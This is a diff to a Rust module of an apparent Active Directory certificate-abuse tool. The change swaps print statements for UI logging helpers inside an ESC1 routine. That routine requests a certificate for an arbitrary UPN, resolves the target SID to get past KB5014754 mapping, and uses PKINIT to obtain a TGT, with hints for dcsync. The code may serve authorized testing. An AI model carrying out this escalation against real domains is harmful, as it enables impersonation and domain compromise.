@@ -16,6 +16,7 @@
 //! the SID mapping the KDC now requires. The cert is still issued (the template
 //! is still vulnerable) — only the escalation path is closed.
 
+use crate::ui;
 use anyhow::Result;
 use clap::Parser;
 
@@ -100,15 +101,17 @@ async fn esc1_impl(a: Esc1Args, checklist: &mut crate::ui::StageChecklist) -> Re
     } else if a.pkinit {
         match auto_resolve_target_sid(&a, subject).await {
             Ok(sid) => {
-                eprintln!("[*] auto-resolved --sid={sid} for {subject} (KB5014754 bypass)");
+                ui::info(&format!(
+                    "auto-resolved --sid={sid} for {subject} (KB5014754 bypass)"
+                ));
                 Some(sid)
             }
             Err(e) => {
-                eprintln!(
-                    "[!] auto-resolve of --sid failed ({e}); the issued cert will NOT carry \
+                ui::warn(&format!(
+                    "auto-resolve of --sid failed ({e}); the issued cert will NOT carry \
                      the KB5014754 strong-mapping extension. Pass --sid <SID> explicitly if \
                      PKINIT fails with error_code 66."
-                );
+                ));
                 None
             }
         }
@@ -134,7 +137,10 @@ async fn esc1_impl(a: Esc1Args, checklist: &mut crate::ui::StageChecklist) -> Re
         "build CSR (UPN SAN)",
         format!("subject={subject}, SAN upn={}{sid_note}", a.upn),
     );
-    eprintln!("[*] CSR built (subject CN={subject}, SAN upn={})", a.upn);
+    ui::info(&format!(
+        "CSR built (subject CN={subject}, SAN upn={})",
+        a.upn
+    ));
 
     let mut smb = SmbClient::connect(&a.auth.host).await?;
     smb.login(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password)
@@ -170,13 +176,13 @@ async fn esc1_impl(a: Esc1Args, checklist: &mut crate::ui::StageChecklist) -> Re
         );
         std::fs::write(&a.out, &r.cert_der)?;
         checklist.record_ok("write cert + key", format!("{} + {}", a.out, key_path));
-        println!(
-            "[+] ESC1: certificate ISSUED for UPN {} → {} ({} bytes), key → {}",
+        ui::ok(&format!(
+            "ESC1: certificate ISSUED for UPN {} → {} ({} bytes), key → {}",
             a.upn,
             a.out,
             r.cert_der.len(),
             key_path
-        );
+        ));
 
         if a.pkinit {
             let kdc = a.kdc.clone().unwrap_or_else(|| a.auth.host.clone());
@@ -206,10 +212,12 @@ async fn esc1_impl(a: Esc1Args, checklist: &mut crate::ui::StageChecklist) -> Re
                         "PKINIT to TGT (--pkinit)",
                         format!("TGT for {subject}@{realm} → {ccache}"),
                     );
-                    println!("[+] PKINIT OK — TGT obtained as {subject}; ccache → {ccache}");
-                    println!(
+                    ui::ok(&format!(
+                        "PKINIT OK — TGT obtained as {subject}; ccache → {ccache}"
+                    ));
+                    ui::note(&format!(
                         "    KRB5CCNAME={ccache} → use for Kerberos auth (dcsync, exec via -k, …)"
-                    );
+                    ));
                 }
                 Err(e) => {
                     // Not a stage failure — the cert IS issued; PKINIT is just the optional
@@ -221,12 +229,12 @@ async fn esc1_impl(a: Esc1Args, checklist: &mut crate::ui::StageChecklist) -> Re
                         format!("PKINIT failed: {e}").chars().take(80).collect()
                     };
                     checklist.record_ok("PKINIT to TGT (--pkinit)", brief);
-                    println!("[-] PKINIT with the issued cert failed: {e:#}");
+                    ui::bad(&format!("PKINIT with the issued cert failed: {e:#}"));
                     if e.to_string().contains("error 66") {
-                        println!("    (KDC_ERR_CANT_VERIFY_CERTIFICATE — likely strong certificate-mapping");
-                        println!("     enforcement (KB5014754): a UPN-only cert has no SID mapping to the");
-                        println!("     target, so the KDC refuses it. ESC1 escalation is mitigated on this DC.");
-                        println!("     The cert was still issued — the template is vulnerable.)");
+                        ui::note("    (KDC_ERR_CANT_VERIFY_CERTIFICATE — likely strong certificate-mapping");
+                        ui::note("     enforcement (KB5014754): a UPN-only cert has no SID mapping to the");
+                        ui::note("     target, so the KDC refuses it. ESC1 escalation is mitigated on this DC.");
+                        ui::note("     The cert was still issued — the template is vulnerable.)");
                     }
                 }
             }
